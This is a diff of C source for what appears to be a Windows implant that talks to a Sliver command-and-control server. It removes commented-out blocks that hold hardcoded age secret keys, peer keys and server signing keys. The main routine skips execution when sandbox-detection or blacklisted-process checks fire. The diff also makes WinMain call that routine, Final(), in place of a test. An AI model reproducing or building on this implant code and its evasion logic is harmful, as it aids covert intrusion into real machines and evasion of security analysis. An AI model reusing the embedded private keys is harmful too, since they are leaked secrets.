@@ -1783,7 +1783,7 @@ void test114(void) {
 }
 
 void test115(void) {
-	PBUFFER pMarshaledEnvelope = NULL;
+	/*PBUFFER pMarshaledEnvelope = NULL;
 	DWORD i = 0;
 	CHAR szName[] = "Demo.txt";
 	PDRIVE_CONFIG pDriveConfig = NULL;
@@ -1863,7 +1863,7 @@ CLEANUP:
 
 	FreeDriveClient(pDriveClient);
 	FreeBuffer(pMarshaledEnvelope);
-	return Result;
+	return Result;*/
 }
 
 void test116(void) {
@@ -2395,56 +2395,6 @@ VOID Final(VOID)
 	WCHAR wszConfigPath[MAX_PATH];
 	LPWSTR lpTemp = NULL;
 
-//#ifdef _BEACON
-//	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
-//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-//	CHAR szPeerPubKey[] = "age1z8yd2vkrxqelp82fhhsqwql5zvvjl2jzc2us03uqu9j72ve79g8s4fcp6v";
-//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-12FPRDVR7Y9J7GHHCE3R0UN0MKLC7RS3Z48NW0C9CJ3PWJU3HX6UQFLMXPN";
-//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-//	CHAR szSliverClientName[] = "SOFT_TUNIC";
-//	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
-//#elif _SESSION
-//	// From Phan Chu Trinh
-//	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-//	CHAR szPeerPubKey[] = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken";
-//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7";
-//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-//	CHAR szSliverClientName[] = "DECISIVE_FERRY";
-//	CHAR szConfigId[] = "9ecd4772-22ed-428d-be07-a2579092f740";
-//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";
-//
-//	// From Tu Dinh
-//	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-//	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
-//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
-//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-//	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
-//	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
-//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";*/
-//#else
-//	// From Phan Chu Trinh
-//	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-//	CHAR szPeerPubKey[] = "age15m9jy6r9m7296x0m4azhp06883llkw8kpyzs64mte5rv5s5zrf6qz2hmse";
-//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15T653732A6NJFGP0RCUL3UUEE0JY0D9YRRL0WJ5T697SZSULA4WSL4KEV2";
-//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+W4BCidBiGftXn3B5BhF2iTvOKLITSXl8VuKkPw/0kWDwiDbrkvg9jbNmZD1bAkFCUpMtvri+4OsKLESnwmDuAs=\ntrusted comment: timestamp:1730337887\nxCTWnliJrfPawWnUmTY2P7ccJRZSa6LnyjMEdZCgEhef02WbBJh8RfMsz/I/ZrmPtpCNc1F4n2U+kghilIuzDA==";
-//	CHAR szSliverClientName[] = "TECHNICAL_FORAY";
-//	CHAR szConfigId[] = "5559e761-e90c-4b5e-893d-58eb247aa086";*/
-//
-//	// From Tu Dinh
-//	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-//	CHAR szPeerPubKey[] = "age1kcgw9sshhgjl99gtdqg5crtlx9e9dgnm688j9ce98pcz6dwt73zs6jj4nm";
-//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1KJ8M0NGRMJ90W2U08LVJLLA848TKXP6QKTH30STS3NHXV5MEDJ4Q95FZUM";
-//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+R1arZLraIBUFzy0FUA0fqQpdqqvpOtaYQ4T6EQa9BWN6G096nSfuMikQayWIdxsyc0/cqy0hppjz8NPqZbl+g4=\ntrusted comment: timestamp:1730114144\nkpsqCc+x7Ag2kVnhTXSuhY4VJkI/KGV5KR6unjmlYUEEKTP9z5UZc+8Rtxir2/QqLV+gJOj6JY+xXMpb0mytDA==";
-//	CHAR szSliverClientName[] = "WORRIED_ABDOMEN";
-//	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";
-//#endif
-
 #ifndef _DEBUG
 	if (DetectSandbox4() || DetectSandbox5() || CheckForBlackListProcess()) {
 		goto CLEANUP;
@@ -2541,6 +2491,7 @@ DWORD MessageLoop
 	HWND hWndMain = NULL;
 	MSG Msg;
 	DWORD dwRetcode = 0;
+	WCHAR wszClassName[] = L"ShutdownWin";
 
 	SecureZeroMemory(&WndClass, sizeof(WndClass));
 	WndClass.cbSize = sizeof(WNDCLASSEX);
@@ -2553,14 +2504,14 @@ DWORD MessageLoop
 	WndClass.hCursor = LoadCursorW(NULL, IDC_ARROW);
 	WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
 	WndClass.lpszMenuName = NULL;
-	WndClass.lpszClassName = DuplicateStrW(L"ShutdownWin", 0);
+	WndClass.lpszClassName = wszClassName;
 	WndClass.hIconSm = LoadIconW(NULL, IDI_APPLICATION);
 	if (!RegisterClassExW(&WndClass)) {
 		LOG_ERROR("RegisterClassExW", GetLastError());
 		goto CLEANUP;
 	}
 
-	hWndMain = CreateWindowExW(WS_EX_CLIENTEDGE, L"ShutdownWin", NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
+	hWndMain = CreateWindowExW(WS_EX_CLIENTEDGE, wszClassName, NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
 	if (hWndMain == NULL) {
 		LOG_ERROR("CreateWindowExW", GetLastError());
 		goto CLEANUP;
@@ -2575,7 +2526,6 @@ DWORD MessageLoop
 
 	dwRetcode = Msg.wParam;
 CLEANUP:
-	FREE(WndClass.lpszClassName);
 
 	return dwRetcode;
 }
@@ -2594,7 +2544,9 @@ int WinMain
 	HANDLE hThread = NULL;
 
 #ifdef _DEBUG
-	AttachConsole(GetParentProcessId(GetCurrentProcessId()));
+	if (!AttachConsole(GetParentProcessId(GetCurrentProcessId()))) {
+		AllocConsole();
+	}
 #endif
 	if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
 		if (!SetProcessShutdownParameters(dwLevel, SHUTDOWN_NORETRY)) {
@@ -2764,9 +2716,9 @@ int WinMain
 	//test131();
 	//test132();
 	//test133();
-	test134();
+	//test134();
 	//test135();
-	//Final();
+	Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
 	if (hThread != NULL) {
